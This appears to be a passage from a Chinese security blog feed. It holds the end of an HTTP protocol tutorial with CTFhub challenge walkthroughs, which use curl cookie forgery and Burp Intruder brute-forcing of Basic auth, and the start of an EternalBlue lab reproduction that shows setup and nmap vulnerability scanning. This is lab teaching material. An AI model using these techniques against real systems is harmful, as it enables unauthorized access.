表示回车和换行。</p><p>（2)首部行：<br>起始行后面有零个或多个字段。每个字段都包含一个名字和一个值,为了便于解析,两者之间用冒号(:)来分隔，首部以一个空行结束。<br>用于说明浏览器、服务器或报文主体的一些信息。在每一个首部行中都有首部字段名和它的值，每一行在结束的地方都要有“回车”和“换行”。整个首部行结束时，还有以空行将首部行和后面的实体分开。</p><p>（3)主体：<br>空行之后就是可选的报文主体了，其中包含了所有类型的数据。请求主体是要发送给服务器的数据;响应主体是要返回给客户端的数据。在请求报文中一般不用这个字段，而在响应报文中也可能没有这个字段。</p><h2 id="Request请求报文"><a href="#Request请求报文" class="headerlink" title="Request请求报文"></a>Request请求报文</h2><blockquote><p>  HTTP请求报文——从客户向服务器发送请求报文</p></blockquote><p>  HTTP的请求报文由三部分组成 : 请求行 , 首部行和实体 , 如下图 :<br><img src="https://img-blog.csdnimg.cn/20210328202511308.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>请求行：请求行由请求方法字段、URL字段和HTTP协议版本字段3个字段组成，它们用空格分隔。比如 GET /data/info.html HTTP/1.1。方法字段就是HTTP使用的请求方法，比如常见的GET/POST</li><li>请求头：浏览器向服务器发送请求的时候必须指明请求类型(一般是GET或者 POST)。如有必要，客户程序还可以选择发送其他的请求头。大多数请求头并不是必需的，但Content-Length除外。对于POST请求来说 Content-Length必须出现。</li><li>实体：若方法字段是GET，则此项为空，没有数据。若方法字段是POST,则通常来说此处放置的就是要提交的数据</li></ul><h3 id="请求报文实例"><a href="#请求报文实例" class="headerlink" title="请求报文实例"></a>请求报文实例</h3><p>抓包本地搭建的登陆页面，得到请求头：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /test/login.html HTTP/1.1        <span class="hljs-comment">#请求方法为POST，请求URL为/test/login.html，HTTP协议版本为HTTP/1.1</span><br>Host: 127.0.0.1<span class="hljs-comment">#客户机通过这个头告诉服务器，想访问的主机名</span><br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0  <span class="hljs-comment">#指定用户代理服务器的类型。</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2   <span class="hljs-comment">#指出客户浏览器支持的语言是英语（english）</span><br>Accept-Encoding: gzip, deflate        <span class="hljs-comment">#指出发送此请求的浏览器支持哪些压缩编码方式。</span><br>Content-Type: application/x-www-form-urlencoded      <span class="hljs-comment">#表示后面的文档属于什么MIME类型</span><br>Content-Length: 26 <span class="hljs-comment">#表示内容长度</span><br>Origin: http://127.0.0.1     <span class="hljs-comment">#Origin主要是用来说明最初请求是从哪里发起的；</span><br>Connection: close         <span class="hljs-comment">#是在告知服务器本浏览器不想使用永久连接方式（HTTP/1.0使用非永久连接，HTTP/1.1默认使用永久连接）。</span><br>Referer: http://127.0.0.1/test/index.html   <span class="hljs-comment">#客户机通过这个头告诉服务器，它是从哪个资源来访问服务器的</span><br>Cookie: _ga=GA1.1.1592130974.1616653076; bdshare_firstime=1616653211943       <span class="hljs-comment">#客户机通过这个头可以向服务器带数据</span><br>Upgrade-Insecure-Requests: 1        <span class="hljs-comment">#表示能读懂服务器发过来的上面这条信息</span><br><br>username=<span class="hljs-built_in">test</span>&amp;password=123     <span class="hljs-comment">#请求数据</span><br></code></pre></td></tr></table></figure><h3 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h3><p>方法字段指出客户请求服务器执行的一般操作。HTTP/1.1中定义了八种请求方法，其中GET、POST、HEAD、是常用请求方法。<br>| 方法    | 描述                                                         |<br>| ——- | ———————————————————— |<br>| GET     | 获取一个URL指定的资源,即资源实体。                           |<br>| POST    | 传输实体主体,向服务器提交数据。                              |<br>| HEAD    | 获取一个指定资源的信息,类似GET方法，区别在于只返回报文首部，不返回报文主体。 |<br>| PUT     | 向服务器提交资源,用来传输文件。                              |<br>| DELETE  | 请求源服务器删除Request-URI标识的资源,用来删除文件。         |<br>| TRACE   | 网络跟踪                                                     |<br>| CONNECT | 与PROXY之间的连接管理,要求用隧道协议连接代理。               |<br>| OPTIONS | 查询能力,询问支持方法返回服务器支持的方法。                  |</p><p><strong>GET和POST之间的区别</strong></p><p>1、GET方法的数据参数是暴露在起始行的URL中的，而POST方法的数据参数是在报文主体中的。<br>2、GET方法相对来说没有POST安全，因为它的数据参数可以直接从URL中获取，但是GET的效率更高。<br>3、GET方法的数据参数大小有一定的限制（1024）（原因也是因为它的数据参数是放在URL中的），而POST对数据大小是没有限制的。<br>其实他们的本质区别是GET是从服务器上请求数据，而POST是向服务器发送数据</p><h3 id="请求报文属性"><a href="#请求报文属性" class="headerlink" title="请求报文属性"></a>请求报文属性</h3><p>请求头部为请求报文添加了一些附加信息，由“名/值”对组成，每行一对，名和值之间使用冒号分隔</p><p>常见请求头如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">Client-IP：提供了运行客户端的机器的IP地址<br><br>From：提供了客户端用户的E-mail地址<br><br>Host：给出了接收请求的服务器的主机名和端口号<br><br>Referer：提供了包含当前请求URI的文档的URL，服务器能知道你是从哪个页面过来的<br><br>UA-Color：提供了与客户端显示器的显示颜色有关的信息<br><br>UA-CPU：给出了客户端CPU的类型或制造商<br><br>UA-OS：给出了运行在客户端机器上的操作系统名称及版本<br><br>User-Agent：将发起请求的应用程序名称告知服务器 <br>      <br>Accept：告诉服务器能够发送哪些媒体类型<br><br>Accept-Charset：告诉服务器能够发送哪些字符集<br><br>Accept-Encoding：告诉服务器能够发送哪些编码方式<br><br>Accept-Language：告诉服务器能够发送哪些语言<br><br>TE：告诉服务器可以使用那些扩展传输编码<br><br>Expect：允许客户端列出某请求所要求的服务器行为<br><br>Range：如果服务器支持范围请求，就请求资源的指定范围<br><br>Cookie：客户端用它向服务器传送数据<br><br>Cookie2：用来说明请求端支持的cookie版本<br><br>Upgrade-Insecure-Requests：表示能读懂服务器发过来的上面这条信息，并且在以后发请求的时候不用http而用https<br></code></pre></td></tr></table></figure><h2 id="Response响应报文"><a href="#Response响应报文" class="headerlink" title="Response响应报文"></a>Response响应报文</h2><blockquote><p>  HTTP响应报文——从服务器到客户的回答</p></blockquote><p>   HTTP的请求报文由三部分组成 : 状态行 、 首部行和实体 , 如下图 :<br><img src="https://img-blog.csdnimg.cn/20210328202534215.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>响应行：响应行一般由协议版本、状态码及其描述组成 比如 HTTP/1.1 200 OK。其中协议版本HTTP/1.1或者HTTP/1.0，200就是它的状态码，OK则为它的描述。</li><li>响应头：响应头用于描述服务器的基本信息，以及数据的描述，服务器通过这些数据的描述信息，可以通知客户端如何处理等一会儿它回送的数据。</li><li>响应体：响应体就是响应的消息体，如果是纯数据就是返回纯数据，如果请求的是HTML页面，那么返回的就是HTML代码，如果是JS就是JS代码，如此之类。<h3 id="响应报文实例"><a href="#响应报文实例" class="headerlink" title="响应报文实例"></a>响应报文实例</h3>抓包本地搭建的登陆页面，得到响应头：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">HTTP/1.1 200 OK   <span class="hljs-comment">#HTTP协议及版本 状态码</span><br>Date: Mon, 29 Mar 2021 02:57:52 GMT  <span class="hljs-comment">#服务器创建并发送本响应消息的日期和时间。</span><br>Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45  <span class="hljs-comment">#服务器和版本号</span><br>Last-Modified: Mon, 29 Mar 2021 02:57:07 GMT  <span class="hljs-comment">#对象本身的创建或最后修改日期或时间</span><br>ETag: <span class="hljs-string">&quot;8e-5bea4098d63cb&quot;</span>   <span class="hljs-comment">#缓存相关的头</span><br>Accept-Ranges: bytes  <span class="hljs-comment">#标识自身支持范围请求(partial requests)</span><br>Content-Length: 142  <span class="hljs-comment">#所发送对象的字节数</span><br>Connection: close    <span class="hljs-comment">#处理完这次请求后是否断开连接还是继续保持连接</span><br>Content-Type: text/html  <span class="hljs-comment">#包含在实体中的对象是HTML文本</span><br><br>&lt;!DOCTYPE html&gt;    <span class="hljs-comment">#实体部分</span><br>&lt;html&gt;<br>&lt;<span class="hljs-built_in">head</span>&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>    &lt;title&gt;succsss&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>Login succsss!!!<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h3 id="响应状态码"><a href="#响应状态码" class="headerlink" title="响应状态码"></a>响应状态码</h3><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status">HTTP 响应代码</a>，状态代码由服务器发出，以响应客户端对服务器的请求。</p><p>请求报文的方法字段是对所请求对象进行的操作，而响应报文的状态码是一个 3 位数字，可以分为以下 5 类 ：<br>| 状态码类别 | 描述                                         |<br>| ———- | ——————————————– |<br>| 1xx        | 收到请求，继续处理。                         |<br>| 2xx        | 请求已成功接收，理解和接受                   |<br>| 3xx        | 重定向到其它地方                             |<br>| 4xx        | 客户的差错，请求包含错误的语法或无法满足。   |<br>| 5xx        | 服务器的差错，服务器无法满足明显有效的请求。 |</p><p>常见的状态码：</p><table><thead><tr><th>状态码</th><th>描述</th><th>说明</th></tr></thead><tbody><tr><td>200</td><td>OK</td><td>表示从客户端发送给服务器的请求被正常处理并返回</td></tr><tr><td>204</td><td>No Content</td><td>表示客户端发送给客户端的请求得到了成功处理，但在返回的响应报文中不含实体的主体部分</td></tr><tr><td>301</td><td>Moved Permanently</td><td>永久重定向，表示请求的资源被分配了新的URL，之后应使用更改的URL。</td></tr><tr><td>302</td><td>Found</td><td>临时重定向，表示请求的资源被分配了新的URL，希望本次访问使用新的URL。</td></tr><tr><td>304</td><td>Not Modified</td><td>缓存文件并未过期，还可继续使用，无需再次从服务端获取</td></tr><tr><td>400</td><td>Bad Request</td><td>客户端请求有语法错误，不能被服务器识别</td></tr><tr><td>401</td><td>Unauthorized</td><td>未经许可，需要通过HTTP认证</td></tr><tr><td>403</td><td>Forbidden</td><td>服务器接收到请求，但是拒绝提供服务。</td></tr><tr><td>404</td><td>Not Found</td><td>请求资源不存在</td></tr><tr><td>500</td><td>Internal Server Error</td><td>服务器内部错误</td></tr><tr><td>503</td><td>Server Unavailable</td><td>服务器暂时不能处理客户端的请求</td></tr></tbody></table><h3 id="响应报文属性"><a href="#响应报文属性" class="headerlink" title="响应报文属性"></a>响应报文属性</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs xml">Age：(从最初创建开始)响应持续时间<br><br>Public：服务器为其资源支持的请求方法列表<br><br>Retry-After：如果资源不可用的话，在此日期或时间重试<br><br>Server：服务器应用程序软件的名称和版本<br><br>Title：对HTML文档来说，就是HTML文档的源端给出的标题<br><br>Warning：比原因短语更详细一些的警告报文<br><br>ETag：一个代表响应服务端资源（如页面）版本的报文头属性，如果某个服务端资源发生变化了，这个ETag就会相应发生变化。<br><br>Accept-Ranges：对此资源来说，服务器可接受的范围类型<br><br>Vary：服务器会根据这些首部的内容挑选出最适合的资源版本发送给客户端<br><br>Proxy-Authenticate：来自代理的对客户端的质询列表<br><br>Set-Cookie：服务端可以设置客户端的Cookie，以便服务器对客户端进行标识。<br><br>Set-Cookie2：与Set-Cookie类似<br><br>WWW-Authenticate：来自服务器的对客户端的质询列表<br><br></code></pre></td></tr></table></figure><h1 id="HTTP协议实战练习"><a href="#HTTP协议实战练习" class="headerlink" title="HTTP协议实战练习"></a>HTTP协议实战练习</h1><p>题目来自CTFhub靶场：Web前置技能-HTTP协议</p><h2 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h2><p>HTTP 请求方法, HTTP/1.1协议中共定义了八种方法（也叫动作）来以不同方式操作指定的资源。</p><p><img src="https://img-blog.csdnimg.cn/20210329161254214.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>方法一：<br>burpsite抓包，自定义CTFHUB方法请求 index.php 即可拿到 flag。<br><img src="https://img-blog.csdnimg.cn/20210329161305347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>方法二：<br>使用curl命令查看服务器的返回信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -v -X CTFHUB challenge-9661cba9e188a4c8.sandbox.ctfhub.com:10080/index.php<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210329162918897.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h2><p>HTTP临时重定向<br><img src="https://img-blog.csdnimg.cn/20210329202651177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>点击超链接无反应，查看源码发现了index.php，而此时url栏是index.html<br><img src="https://img-blog.csdnimg.cn/20210329202712652.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>burpsite抓包，在响应包得到flag<br><img src="https://img-blog.csdnimg.cn/20210329202803184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>方法二：<br>curl命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -i http://challenge-f6959bd27c1b2b09.sandbox.ctfhub.com:10080/index.php<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210329161745105.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl命令<br>https://blog.csdn.net/qq_45738111/article/details/105265455<br></code></pre></td></tr></table></figure><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>Cookie欺骗、认证、伪造</p><p><a href="http://challenge-67f523772f2e5d91.sandbox.ctfhub.com:10080/">http://challenge-67f523772f2e5d91.sandbox.ctfhub.com:10080</a><br>方法一：</p><p>抓包，响应头提示只有admin才能得到flag，此时请求头Cookie的值为admin=0<br><img src="https://img-blog.csdnimg.cn/20210329200457714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>改为admin=1，得到flag<br><img src="https://img-blog.csdnimg.cn/20210329200506541.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>方法二：</p><p>可以使用curl命令的”-H”参数来为http请求头添加cookie键值来发送cookie：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -i -H <span class="hljs-string">&quot;Cookie:admin=1&quot;</span> http://challenge-67f523772f2e5d91.sandbox.ctfhub.com:10080/<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210329191357125.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="基础认证"><a href="#基础认证" class="headerlink" title="基础认证"></a>基础认证</h2><p>在HTTP中，基本认证（英语：Basic access authentication）是允许http用户代理（如：网页浏览器）在请求时，提供 用户名 和 密码 的一种方式。详情请查看 <a href="https://zh.wikipedia.org/wiki/HTTP%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%81">https://zh.wikipedia.org/wiki/HTTP基本认证</a></p><p>访问题目地址<br><img src="https://img-blog.csdnimg.cn/20210329192024754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>跳转到登陆页面<br><img src="https://img-blog.csdnimg.cn/2021032919204261.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>先输入弱密码admin\123456登陆，然后抓包<br><img src="https://img-blog.csdnimg.cn/20210329192830793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>在请求头发现一段base64编码，解码得到<code>admin:123456</code>，而在响应头发现一段话Do u know admin ?，再结合题目附件中给的字典，所以说本题应该是爆破管理员密码，与以往爆破密码不同的是，账号和密码一起被base64加密了。</p><p>将请求报文发送到Intruder，点击Add，将 Basic 后面 base64 部分添加为 payload position<br><img src="https://img-blog.csdnimg.cn/20210329193459133.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>在Payload Options模块中点击load添加字典，在Payload Processing模块中点击添加选择Add prefix，其值为<code>admin:</code>,继续选择encode，其值为base64-encode，最后点击Start attck开始爆破<br><img src="https://img-blog.csdnimg.cn/20210329194328455.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>爆破结果按Length排序，发现值为<code>YWRtaW46MTIzMzIx</code>，此时状态码为200，说明是正确的账号密码。<br><img src="https://img-blog.csdnimg.cn/20210329194425899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>base64解密得到<code>admin:123321</code>,输入账号密码登陆得到flag，在响应头也能看到flag<br><img src="https://img-blog.csdnimg.cn/20210329194850620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="响应包源代码"><a href="#响应包源代码" class="headerlink" title="响应包源代码"></a>响应包源代码</h2><p>HTTP响应包源代码查看</p><p>访问题目地址<br><img src="https://img-blog.csdnimg.cn/20210329195659368.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>抓包，发包，在响应包源码发现了flag。<br><img src="https://img-blog.csdnimg.cn/20210329195714758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>直接查看源代码也可以发现flag<br><img src="https://img-blog.csdnimg.cn/20210329195946922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>参考:<br><a href="https://baike.baidu.com/item/http/243074?fromtitle=HTTP">百度百科-HTTP协议</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>HTTP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>永恒之蓝漏洞复现</title>
    <link href="/posts/4260011972/"/>
    <url>/posts/4260011972/</url>
    
    <content type="html"><![CDATA[<p>@<a href="%E8%BF%99%E9%87%8C%E5%86%99%E8%87%AA%E5%AE%9A%E4%B9%89%E7%9B%AE%E5%BD%95%E6%A0%87%E9%A2%98">TOC</a></p><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p><strong>永恒之蓝：</strong></p><blockquote><p> 永恒之蓝（Eternal Blue）爆发于2017年4月14日晚，是一种利用Windows系统的SMB协议漏洞来获取系统的最高权限，以此来控制被入侵的计算机。甚至于2017年5月12日， 不法分子通过改造“永恒之蓝”制作了wannacry勒索病毒，使全世界大范围内遭受了该勒索病毒，甚至波及到学校、大型企业、政府等机构，只能通过支付高额的赎金才能恢复出文件。不过在该病毒出来不久就被微软通过打补丁修复。</p></blockquote><p><strong>445端口简介</strong>：</p><blockquote><p> 445端口是一个毁誉参半的端口，有了它我们可以在局域网中轻松访问各种共享文件夹或共享打印机，但也正是因为有了它，黑客们才有了可乘之机，他们能通过该端口偷偷共享你的硬盘，甚至会在悄无声息中将你的硬盘格式化掉! 2017年10月，由于病毒”坏兔子”来袭，国家互联网应急中心等安全机构建议用户及时关闭计算机以及网络设备上的445和139端口 。</p></blockquote><p><strong>相关协议：</strong></p><blockquote><p>SMB协议：SMB(全称是Server MessageBlock)是一个协议名，它能被用于Web连接和客户端与服务器之间的信息沟通。SMB最初是IBM的贝瑞·费根鲍姆（Barry Feigenbaum）研制的，其目的是将DOS操作系统中的本地文件接口“中断13”改造为网络文件系统。（在进行漏洞利用时，可以配合远程桌面协议）</p></blockquote><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.攻击机：kali linux   192.168.182.130<br>2.靶  机：win7x64位    192.168.182.132<br></code></pre></td></tr></table></figure><h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p><strong>靶机</strong><br>1.关闭防火墙<br><img src="https://img-blog.csdnimg.cn/20210310195458792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>2.设置允许远程控制。<br><img src="https://img-blog.csdnimg.cn/20210309195332545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3.禁用共享文件夹<br><img src="https://img-blog.csdnimg.cn/20210309195736608.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p> <strong>真机</strong></p><p>为了防止病毒逃逸感染真机，添加真机的入站规则，阻止445端口连接<br><img src="https://img-blog.csdnimg.cn/20210309200838719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>信息收集</strong><br>用kali 去ping 靶机，来测试连通性：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping -c 4 192.168.182.132 <span class="hljs-comment">#靶机IP</span><br></code></pre></td></tr></table></figure><p>两台主机相互连通<br><img src="https://img-blog.csdnimg.cn/20210322112648199.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用nmap工具对靶机进行端口扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -Pn -sV -T4 192.168.182.132<span class="hljs-comment">#靶机IP</span><br></code></pre></td></tr></table></figure><p>靶机的445端口开放<br><img src="https://img-blog.csdnimg.cn/20210322112847602.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>漏洞脚本检测</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap --script=vuln 192.168.182.132<span class="hljs-comment">#靶机IP</span><br></code></pre></td></tr></table></figure><p>发现了永恒之蓝的漏洞编号ms17-010<br><img 